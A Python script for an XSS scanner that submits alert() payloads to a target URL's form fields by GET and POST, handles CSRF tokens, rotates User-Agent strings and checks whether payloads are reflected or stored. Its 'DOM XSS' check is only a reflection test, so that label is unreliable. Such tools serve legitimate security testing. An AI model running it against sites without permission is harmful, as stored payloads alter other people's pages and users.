import logging
import requests
from bs4 import BeautifulSoup
import argparse
import random
import os
from urllib.parse import urlparse, urljoin
from concurrent.futures import ThreadPoolExecutor


class Logger:
    @staticmethod
    def setup_logger():
        logging.basicConfig(
            level=logging.INFO,
            format="%(asctime)s - %(levelname)s - %(message)s",
            handlers=[logging.FileHandler("xss_scanner.log"), logging.StreamHandler()],
        )


class XSSHandler:
    def __init__(self, agent, cookies, url, threads=5):
        self.agent = agent
        self.cookies = cookies
        self.url = url
        self.threads = threads
        self.headers = {
            "User-Agent": agent if agent else random.choice([
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            ]),
            "Referer": url,
            "Accept-Language": "en-US,en;q=0.9",
            "Cookie": cookies if cookies else "",
        }

    def load_payloads(self, payloads_path):
        """Load XSS payloads from a file or use default ones."""
        if not payloads_path:
            logging.warning("[-] Payloads path not provided, using default payloads.")
            return [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "'><svg/onload=alert('XSS')>",
                "<b onmouseover=alert('XSS')>Hover me!</b>",
                "';alert(1)//",
                "<iframe src='javascript:alert(1)'></iframe>"
            ]
        elif not os.path.exists(payloads_path):
            logging.error(f"[-] Payload file {payloads_path} not found.")
            return []

        with open(payloads_path, "r", encoding="utf-8") as file:
            payloads = [line.strip() for line in file if line.strip()]

        logging.info(f"[+] Loaded {len(payloads)} payloads from {payloads_path}")
        return payloads

    def extract_parameters(self):
        """Extract form parameters from the target URL."""
        response = requests.get(self.url, headers=self.headers, timeout=10)
        soup = BeautifulSoup(response.text, "html.parser")
        params = [tag.get("name") for tag in soup.find_all("input") if tag.get("name")]
        logging.info(f"[+] Extracted parameters: {params}")
        return params if params else ["search"]

    def fetch_csrf_token(self, response):
        """Extract CSRF token from HTML response."""
        soup = BeautifulSoup(response.text, "html.parser")
        token = soup.find("input", {"name": "csrf_token"})  # Adjust for specific sites
        return token["value"] if token else None

    def send_payload(self, payload, param, method="GET"):
        """Send a payload to the target URL using GET or POST."""
        params = {param: payload}
        response = None

        try:
            if method == "GET":
                response = requests.get(self.url, params=params, headers=self.headers, timeout=10)
            else:
                csrf_token = self.fetch_csrf_token(requests.get(self.url, headers=self.headers, timeout=10))
                data = params
                if csrf_token:
                    data["csrf_token"] = csrf_token
                response = requests.post(self.url, data=data, headers=self.headers, timeout=10)

            response.raise_for_status()
        except requests.exceptions.RequestException as e:
            logging.error(f"[-] Error sending request: {e}")
        
        return response

    def check_dom_xss(self, response, payload):
        """Check for DOM-based XSS vulnerabilities."""
        if response and payload in response.text:
            logging.critical(f"[!!!] DOM XSS Detected! Payload reflected in response.")
            logging.info(f"[i] Payload: {payload}")
            logging.info(f"[i] Response Snippet: {response.text[:200]}")

    def check_reflected_xss(self, response, payload):
        """Check if the payload is reflected in the response."""
        if response and payload in response.text:
            logging.warning(f"[!] Reflected XSS Found! Payload echoed back.")
            logging.info(f"[i] Payload: {payload}")

    def check_stored_xss(self, payload, param):
        """Check if stored XSS is present by reloading the page after submitting payload."""
        logging.info(f"[*] Testing for stored XSS with payload: {payload}")

        post_response = self.send_payload(payload, param, method="POST")

        if post_response and post_response.status_code in [200, 201]:
            logging.info("[+] POST request successful, checking for stored XSS...")

            response = requests.get(self.url, headers=self.headers, timeout=10)
            if response and payload in response.text:
                logging.critical(f"[!!!] Stored XSS Found! Payload found in response after refresh.")
            else:
                logging.info("[*] No stored XSS detected yet. Retrying after delay...")

                
                import time
                time.sleep(3)
                response = requests.get(self.url, headers=self.headers, timeout=10)
                if response and payload in response.text:
                    logging.critical(f"[!!!] Stored XSS Confirmed on retry!")

    def scan(self, payloads):
        """Run XSS tests with multi-threading."""
        params = self.extract_parameters()
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            for payload in payloads:
                for param in params:
                    executor.submit(self.run_tests, payload, param)

    def run_tests(self, payload, param):
        """Execute all XSS tests for a given payload."""
        logging.info(f"[*] Testing {param} with payload: {payload}")

        response = self.send_payload(payload, param, method="GET")
        if response:
            self.check_dom_xss(response, payload)
            self.check_reflected_xss(response, payload)
        self.check_stored_xss(payload, param)


class CLI:
    @staticmethod
    def parse_arguments():
        parser = argparse.ArgumentParser(description="Advanced XSS Scanner")
        parser.add_argument("-u", "--url", type=str, required=True, help="Target URL (e.g., http://example.com)")
        parser.add_argument("-c", "--cookie", type=str, help="Session Cookie (e.g., -c 'PHPSESID=12345')")
        parser.add_argument("-a", "--user-agent", type=str, help="Custom User-Agent string")
        parser.add_argument("-p", "--payloads", type=str, help="Path to file containing XSS payloads")
        parser.add_argument("-t", "--threads", type=int, default=5, help="Number of concurrent threads")
        return parser.parse_args()


if __name__ == "__main__":
    Logger.setup_logger()
    args = CLI.parse_arguments()
    xss_handler = XSSHandler(args.user_agent, args.cookie, args.url, args.threads)
    payloads = xss_handler.load_payloads(args.payloads)
    xss_handler.scan(payloads)
